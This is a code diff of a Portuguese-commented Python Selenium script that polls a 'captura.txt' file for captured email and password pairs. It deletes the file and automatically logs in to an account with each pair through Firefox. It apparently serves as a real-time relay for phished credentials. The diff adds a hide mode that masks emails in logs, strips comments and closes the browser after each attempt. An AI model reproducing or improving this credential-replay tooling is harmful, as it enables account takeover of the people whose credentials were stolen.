@@ -9,28 +9,32 @@ import time
 import os
 import sys
 
-# Garante caminhos absolutos
+# Verifica modo oculto
+HIDE_MODE = "-hide" in sys.argv
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 ARQUIVO_ALVO = os.path.join(BASE_DIR, "captura.txt")
 
 print(f"[Selenium] Serviço iniciado PID: {os.getpid()} | User ID: {os.getuid()}")
+if HIDE_MODE:
+    print("[Selenium] Modo Privacidade Ativo.")
 
-# Configurações do Firefox (instanciadas uma vez, reutilizadas no loop)
 options = Options()
 options.add_argument("--no-sandbox")
 options.add_argument("--disable-dev-shm-usage")
 
 
-# options.add_argument("--headless") # Descomente para ocultar o navegador
+def get_log_email(email):
+    """Retorna email censurado se o modo hide estiver ativo"""
+    if HIDE_MODE:
+        return "*****@*****.com"
+    return email
+
 
 def realizar_login(email, senha):
-    """
-    Função encapsulada para abrir, tentar logar e fechar o navegador.
-    Isso garante uma sessão limpa (sem cookies antigos) a cada tentativa.
-    """
     driver = None
     try:
-        print(f"[Selenium] Iniciando browser para testar: {email}")
+        print(f"[Selenium] Iniciando browser para testar: {get_log_email(email)}")
         service = Service(GeckoDriverManager().install())
         driver = webdriver.Firefox(service=service, options=options)
         wait = WebDriverWait(driver, 20)
@@ -58,12 +62,15 @@ def realizar_login(email, senha):
         )
         driver.execute_script("arguments[0].click();", password_next)
 
-        # Aguarda resultado visual por 5 segundos
         time.sleep(5)
         print('[Selenium] Tentativa concluída.')
 
     except Exception as e:
         print(f'[Selenium] Erro durante execução: {e}')
+    finally:
+        if driver:
+            print("[Selenium] Fechando navegador...")
+            driver.quit()
 
 
 # --- LOOP PRINCIPAL ---
@@ -73,7 +80,6 @@ while True:
     found_email = ""
     found_senha = ""
 
-    # Loop interno: Fica aqui até encontrar um arquivo válido
     while True:
         if os.path.exists(ARQUIVO_ALVO):
             try:
@@ -87,19 +93,18 @@ while True:
                         if len(temp_email) > 3:
                             found_email = temp_email
                             found_senha = temp_senha
-                            print(f"[Selenium] Credenciais detectadas: {found_email}")
+                            print(f"[Selenium] Credenciais detectadas: {get_log_email(found_email)}")
                             try:
                                 os.remove(ARQUIVO_ALVO)
                             except:
                                 pass
-                            break  # Sai do loop de espera para executar o login
+                            break
             except Exception as e:
                 print(f"[Selenium] Erro ao ler arquivo: {e}")
                 time.sleep(1)
 
-        time.sleep(1)  # Checa o arquivo a cada 1 segundo
+        time.sleep(1)
 
-    # Executa a função de login
     realizar_login(found_email, found_senha)
 
     print("[Selenium] Aguardando 1 minuto antes de processar a próxima captura...")
